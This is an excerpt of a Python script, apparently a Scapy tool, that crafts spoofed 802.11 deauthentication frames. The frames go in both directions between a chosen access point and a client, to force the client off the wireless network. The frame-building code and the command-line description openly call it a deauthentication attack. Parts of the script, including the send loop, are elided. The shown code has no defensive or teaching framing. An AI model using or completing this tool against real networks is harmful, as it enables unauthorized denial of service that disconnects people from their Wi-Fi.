...
def action(iface: str, count: int, bssid: str, target_mac: str):
    ...
    dot11a = Dot11(type=0, subtype=12, addr1=bssid, addr2=target_mac, addr3=bssid)
    frame1 = RadioTap()/dot11a/Dot11Deauth(reason=254)
    dot11b = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
    frame2 = RadioTap()/dot11b/Dot11Deauth(reason=254)
...
if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a supplicant using spoofed deauthentication frames sent to both the supplicant and the AP")
    ...
    if (not args.interface or not args.count 
        ...
        print("[-] Please specify all program arguments... run `sudo python3 attack_deauthentication_bidirectional.py -h` for help")
        exit(1)
